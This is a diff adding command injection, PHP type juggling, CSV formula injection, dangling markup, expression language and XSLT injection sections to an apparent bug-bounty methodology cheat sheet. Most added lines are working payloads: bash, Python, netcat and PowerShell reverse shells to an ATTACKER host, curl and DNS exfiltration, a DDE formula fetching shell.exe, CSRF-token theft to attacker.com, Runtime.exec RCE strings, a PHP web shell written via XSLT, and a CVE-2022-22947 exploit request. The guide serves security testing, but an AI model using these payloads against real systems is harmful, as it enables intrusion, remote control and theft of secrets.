@@ -60,6 +60,12 @@ No fluff. No filler. Just the workflow that finds bugs.
 | 4.28 | ↳ [HTTP Parameter Pollution](#428-http-parameter-pollution-hpp) | Duplicate Params · WAF Bypass · Auth |
 | 4.29 | ↳ [GraphQL Security](#429-graphql-security) | Introspection · Batching DoS · CSRF |
 | 4.30 | ↳ [LLM / AI Prompt Injection](#430-llm--ai-prompt-injection) | Direct · Indirect · Tool-Use · ASI01-10 |
+| 4.31 | ↳ [Command Injection](#431-command-injection-cmdi) | Shell Metacharacters · Blind · Reverse Shells |
+| 4.32 | ↳ [PHP Type Juggling](#432-php-type-juggling) | Magic Hashes · Loose == · strcmp Bypass |
+| 4.33 | ↳ [CSV Formula Injection](#433-csv-formula-injection) | DDE · Google Sheets · Export Exploitation |
+| 4.34 | ↳ [Dangling Markup](#434-dangling-markup-injection) | CSP Bypass · Token Exfil · No JS Required |
+| 4.35 | ↳ [Expression Language Injection](#435-expression-language-injection-elspelognl) | SpEL · OGNL · Struts2 · Spring Cloud Gateway |
+| 4.36 | ↳ [XSLT Injection](#436-xslt-injection) | Processor RCE · document() SSRF · EXSLT Write |
 | 5 | [Hunting Mindset](#5-hunting-mindset--methodology) | Strategy · Prioritization · Pivoting |
 | 6 | [POC Creation](#6-proof-of-concept-poc-creation) | Screenshots · Scripts · Automation · Evidence |
 | 7 | [Reporting](#7-reporting) | Professional Write-ups |
@@ -2434,6 +2440,445 @@ ASI-10: Agent-to-agent prompt injection (multi-agent systems)
 ```
 
 ---
+
+<br>
+
+### **4.31 Command Injection (CMDi)**
+
+**🛠️ Tools:** [commix](https://github.com/commixproject/commix), Burp Collaborator
+
+**Shell Metacharacters (Injection Operators)**
+```bash
+;id                 # Run regardless
+|whoami             # Pipe output
+||whoami            # Run if first FAILS
+&whoami&            # Background (Linux) / sequence (Windows)
+&&whoami            # Run if first SUCCEEDS
+$(whoami)           # Command substitution
+`whoami`            # Backtick substitution
+%0aid               # URL-encoded newline
+%0d%0awhoami        # CRLF injection
+```
+
+**Blind Detection — Time-Based**
+```bash
+; sleep 5
+| sleep 5
+$(sleep 5)
+& sleep 5 &
+# Windows:
+& timeout /T 5 /NOBREAK
+& ping -n 5 127.0.0.1
+```
+
+**Blind Detection — OOB Exfiltration**
+```bash
+# DNS
+; nslookup $(whoami).YOUR-COLLABORATOR.oastify.com
+; nslookup %USERNAME%.YOUR-COLLABORATOR.oastify.com   # Windows
+
+# HTTP
+; curl http://YOUR-COLLABORATOR.oastify.com/$(id|base64)
+; wget http://YOUR-COLLABORATOR.oastify.com/?$(hostname)
+
+# File write + request
+; id > /var/www/html/pwned.txt
+# Then: GET /pwned.txt
+```
+
+**Space Bypass (when space is filtered)**
+```bash
+cat</etc/passwd                       # < instead of space
+{cat,/etc/passwd}                     # Brace expansion
+cat$IFS/etc/passwd                    # $IFS variable
+X=$'\x20'&&cat${X}/etc/passwd         # Hex-encoded space
+```
+
+**Keyword Bypass (when "cat" is blocked)**
+```bash
+tac /etc/passwd          # Reverse cat
+nl /etc/passwd           # Number lines
+head /etc/passwd         # First 10 lines
+tail /etc/passwd
+more /etc/passwd
+base64 /etc/passwd       # Then decode offline
+/???/??? /???/?????      # Glob: /bin/cat /etc/passwd
+a=c;b=at; $a$b /etc/passwd     # Variable assembly
+```
+
+**Reverse Shells (Linux)**
+```bash
+; bash -i >& /dev/tcp/ATTACKER/4444 0>&1
+; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+; nc ATTACKER 4444 -e /bin/bash
+; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER 4444 >/tmp/f
+```
+
+**Reverse Shells (Windows PowerShell)**
+```powershell
+& powershell -NoP -NonI -W Hidden -Exec Bypass -c "$c=New-Object Net.Sockets.TCPClient('ATTACKER',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$x=$r+'PS '+(pwd).Path+'> ';$y=([text.encoding]::ASCII).GetBytes($x);$s.Write($y,0,$y.Length);$s.Flush()};$c.Close()"
+```
+
+**Common Vulnerable Entry Points**
+```bash
+# Ping/traceroute forms — "ping 127.0.0.1; id"
+# File converters — ImageMagick, FFmpeg, PDF generators
+# Email senders — "From" address injected into shell command
+# Log viewers — "tail /var/log/INPUT"
+# CI/CD hooks — build parameters, environment variables
+# DNS lookup tools — WHOIS, rDNS, nslookup forms
+```
+
+**PHP disable_functions Bypass**
+```bash
+# LD_PRELOAD + mail():
+putenv("LD_PRELOAD=/tmp/evil.so"); mail("a@b.com","","");
+# evil.so constructor runs
+
+# Shellshock (CVE-2014-6271):
+putenv("PHP_FOO=() { :; }; /usr/bin/id > /tmp/out"); mail("a@b.com","","");
+```
+
+**Automated**
+```bash
+commix --url="https://target.com/ping?ip=127.0.0.1" --batch
+```
+
+---
+
+### **4.32 PHP Type Juggling**
+
+**The Weak Comparison Problem**
+```php
+# In PHP, == (loose) coerces types. === (strict) doesn't.
+# Always grep for == comparisons involving secrets:
+'0e123' == '0e999'     // true (both parse to 0.0)
+'123abc' == 123          // true (string -> 123)
+'abc' == 0              // true (PHP <8)
+NULL == false           // true
+0 == false              // true
+```
+
+**Magic Hashes — `0e` Collision**
+```bash
+# When md5() or sha1() output starts with "0e" + all digits:
+# PHP interprets as scientific notation → 0.0 → all "0e..." hashes are == equal
+md5('240610708') == md5('QNKCDZO')  // true! Both produce 0e... digests
+
+# Payload: ?a=240610708&b=QNKCDZO
+# If code does: if (md5($_GET['a']) == md5($_GET['b']))
+
+# Also for SHA-1:
+sha1('10932435112')  // 0e07766915004133176347055865026311692244
+```
+
+**HMAC Bypass (loose compare vs "0")**
+```bash
+# If code: if (hash_hmac('md5', $data, $key) != '0') 
+# Brute-force $data until HMAC output matches ^0e[0-9]+$
+# Then == 0 passes because 0e... == 0 in PHP
+```
+
+**Common PHP CTF/Real-World Patterns**
+```bash
+# strcmp with arrays → returns NULL → NULL == 0:
+?password[]=1
+
+# json_decode true authentication bypass:
+{"password": true}     # true == "any_string" is often true
+
+# is_numeric + loose compare:
+"0e12345" == 0         // true (0e12345 is numeric + 0.0 == 0)
+
+# intval bypass
+?id=010                // intval("010",0) → 8 (octal)
+?id=0x1A               // intval("0x1A",0) → 26 (hex)
+?id=1e2                // (int)(float)"1e2" → 100
+```
+
+**PHP Version Matters**
+```php
+# PHP 5/7: 0 == "foo" → true (string → 0)
+# PHP 8+:  0 == "foo" → false (fixed!)
+# Always check X-Powered-By header for version
+```
+
+---
+
+### **4.33 CSV Formula Injection**
+
+**Attack Chain**: User input → CSV export → victim opens in Excel/Sheets → code executes
+
+**Detection Payloads**
+```csv
+name,value
+test,=1+1
+test,+1+1
+test,-1+1
+test,@SUM(1+1)
+# If cell displays "2" instead of "=1+1" → formula evaluation confirmed
+```
+
+**DDE Execution (Excel)**
+```csv
+=cmd|'/c calc'!A0
+=cmd|'/C powershell IEX(wget http://attacker/shell.exe)'!A0
+=rundll32|'URL.dll,OpenURL calc.exe'!A
+```
+
+**Google Sheets Functions**
+```csv
+=IMPORTXML("http://attacker.com/", "//a/@href")
+=IMPORTHTML("http://attacker.com/table", "table", 1)
+=IMPORTFEED("http://attacker.com/feed.xml")
+=IMPORTDATA("http://attacker.com/data.csv")
+=IMPORTRANGE("spreadsheet_url", "range")
+# All trigger outbound HTTP from Google's servers
+```
+
+**Testing Methodology**
+```bash
+# Map sinks: any feature emitting CSV/XLSX exports
+# - Admin exports (user lists)
+# - Audit logs
+# - Billing reports
+# - Ticket/order exports
+
+# Inject into user-controlled fields:
+# - Profile name, bio, title
+# - Support ticket subject
+# - Transaction memo
+# - Any field appearing in exports
+```
+
+**Defense Detection**
+```bash
+# Check if export strips/prefixes formula triggers:
+# If '=1+1 becomes '=1+1 → defended (single quote prefix)
+# If =1+1 stays as =1+1 → vulnerable
+```
+
+---
+
+### **4.34 Dangling Markup Injection**
+
+**When to use**: HTML injection exists but JS is blocked (CSP, WAF, sanitizer). Dangling markup doesn't need JavaScript — it steals data using the browser's HTML parser.
+
+**Core Technique**
+```html
+# Inject unclosed tag → browser consumes everything until next matching quote
+<img src="https://attacker.com/collect?
+# Result: all subsequent page HTML becomes part of the URL GET request
+
+# Before:
+<input type="hidden" name="csrf" value="REAL_TOKEN_123">
+
+# After injection + consumption:
+# GET https://attacker.com/collect?REAL_TOKEN_123 comes from <input value="...
+```
+
+**Exfiltration Vectors (by CSP restriction)**
+```html
+# No CSP / lax CSP:
+<img src="https://attacker.com/steal?
+
+# img-src blocked → try form-action:
+<form action="https://attacker.com/collect"><textarea name="data">
+# <textarea> eats ALL subsequent HTML as plaintext
+
+# base-uri unrestricted:
+<base href="https://attacker.com/">
+# All relative URLs now load from attacker
+
+# meta refresh (rarely blocked):
+<meta http-equiv="refresh" content="0;url=https://attacker.com/steal?
+
+# style-src allowed:
+<link rel="stylesheet" href="https://attacker.com/steal?
+
+# DNS prefetch (works even under strict CSP!):
+<link rel="dns-prefetch" href="//stolen-data.attacker.com">
+```
+
+**What Can Be Stolen**
+```bash
+# CSRF tokens from hidden inputs
+# Pre-filled email/password values
+# API keys in inline JS
+# OAuth tokens in URL params
+# Internal URLs and paths
+
+# Key: injection must appear BEFORE target data in HTML source
+# Wrong order = useless. Check DOM structure first.
+```
+
+**Chrome Mitigation Bypass**
+```bash
+# Chrome blocks <img src= containing < or newlines
+# BUT <form action=, <base href=, <meta refresh> are NOT blocked
+# Always try alternative vectors!
+```
+
+---
+
+### **4.35 Expression Language Injection (EL/SpEL/OGNL)**
+
+> Distinct from SSTI — EL targets Java expression evaluators, not template engines
+
+**Detection — Polyglot Probes**
+```text
+${7*7}      → 49 = SpEL, OGNL, or Java EL
+#{7*7}      → 49 = SpEL (alt syntax) or JSF EL
+%{7*7}      → 49 = OGNL (Struts2)
+${T(java.lang.Math).random()}  → random float = SpEL confirmed
+```
+
+**Disambiguation**
+
+| Response to `${7*7}` | Response to `%{7*7}` | Engine |
+|---|---|---|
+| 49 | literal | SpEL or Java EL |
+| literal | 49 | OGNL (Struts2) |
+
+**SpEL (Spring Expression Language) — RCE**
+```java
+${T(java.lang.Runtime).getRuntime().exec("id")}
+
+# With output capture:
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec("id").getInputStream())}
+
+# ProcessBuilder alternative:
+${new java.lang.ProcessBuilder(new String[]{"id"}).start()}
+```
+
+**SpEL — Spring Cloud Gateway (CVE-2022-22947)**
+```bash
+# Add route with SpEL in filter
+POST /actuator/gateway/routes/hacktest
+{"id":"hacktest","filters":[{"name":"AddResponseHeader",
+"args":{"name":"Result","value":"#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream()))}"}}],
+"uri":"http://example.com","predicates":[{"name":"Path","args":{"_genkey_0":"/hackpath"}}]}
+
+# Refresh routes + trigger
+POST /actuator/gateway/refresh
+GET /hackpath
+# Response header "Result" = command output
+```
+
+**OGNL (Struts2) — RCE**
+```
+%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec('id'))}
+```
+
+**Confluence OGNL (CVE-2021-26084)**
+```bash
+POST /pages/createpage-entervariables.action
+queryString=\u0027%2b{3*3}%2b\u0027
+# If response contains "9" → confirmed
+# Escalate to Runtime.exec for RCE
+```
+
+**Java EL (JSP/JSF) — RCE**
+```java
+${"".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}
+```
+
+**Decision**
+```bash
+# Java app reflects ${7*7} as 49?
+# ├── Struts2? → Try %{...} OGNL
+# │   └── Check Content-Type injection (S2-045)
+# ├── Spring? → Try T(java.lang.Runtime) SpEL
+# │   └── Check /actuator/gateway
+# ├── Confluence? → OGNL via queryString
+# └── JSP/JSF? → Java EL payloads
+```
+
+---
+
+### **4.36 XSLT Injection**
+
+> When user-controlled XSLT stylesheets are compiled server-side
+
+**Detection — Probe for Execution**
+```xml
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+  <xsl:template match="/">
+    <xsl:value-of select="'XSLT_PROBE_OK'"/>
+  </xsl:template>
+</xsl:stylesheet>
+```
+
+**Processor Fingerprinting**
+```xml
+<xsl:value-of select="system-property('xsl:vendor')"/>
+<xsl:value-of select="system-property('xsl:version')"/>
+# Apache Software Foundation → Xalan (Java)
+# libxslt → PHP/nginx
+# Microsoft → .NET
+```
+
+**File Read via document()**
+```xml
+<xsl:copy-of select="document('/etc/passwd')"/>
+<xsl:copy-of select="document('file:///c:/windows/win.ini')"/>
+```
+
+**SSRF via document()**
+```xml
+<xsl:copy-of select="document('http://attacker.com/ssrf')"/>
+<xsl:copy-of select="document('http://169.254.169.254/latest/meta-data/')"/>
+```
+
+**File Write via EXSLT**
+```xml
+<xsl:stylesheet version="1.0"
+  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+  xmlns:ex="http://exslt.org/common" extension-element-prefixes="ex">
+  <ex:document href="/tmp/evil.txt" method="text">
+    <xsl:text>CONTROLLED CONTENT</xsl:text>
+  </ex:document>
+</xsl:stylesheet>
+```
+
+**RCE — PHP (php:function)**
+```xml
+<xsl:value-of select="php:function('readfile','index.php')"/>
+<xsl:value-of select="php:function('scandir','.')"/>
+<xsl:value-of select="php:function('file_put_contents','/var/www/shell.php','<?php system(\$_GET[\"c\"]);?>')"/>
+```
+
+**RCE — Java (Xalan extensions)**
+```xml
+<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+  xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
+  <xsl:variable name="o" select="rt:getRuntime()"/>
+  <xsl:value-of select="rt:exec($o,'id')"/>
+</xsl:stylesheet>
+```
+
+**RCE — .NET (msxsl:script)**
+```xml
+<msxsl:script language="C#" implements-prefix="user"><![CDATA[
+public string exec() {
+  System.Diagnostics.Process.Start("cmd.exe", "/c whoami");
+  return "done";
+}]]></msxsl:script>
+<xsl:value-of select="user:exec()"/>
+```
+
+**Injection Points**
+```bash
+# Parameters: xslt=, stylesheet=, template=, transform=
+# XML→HTML converters, report generators
+# SOAP endpoints with XSLT processing
+```
+
+---
+
+<br>
+
+## **5. Hunting Mindset & Methodology**
 
 > *"Scanners find noise. Hunters find impact."*
 
